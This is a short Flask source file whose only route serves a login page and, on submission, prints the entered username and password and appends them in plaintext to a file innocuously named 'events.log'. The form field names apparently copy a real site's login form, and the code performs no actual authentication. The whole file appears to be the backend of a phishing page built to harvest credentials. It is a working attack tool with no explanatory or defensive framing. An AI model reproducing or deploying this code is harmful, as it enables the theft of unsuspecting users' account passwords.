from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username=request.form.get("session_key")
        password=request.form.get("session_password")
        print(f"Username: {username}\nPassword: {password}")

        with open("events.log", "a") as f:
            f.write(f"username: {username}, password: {password}\n")

    return render_template("index.html")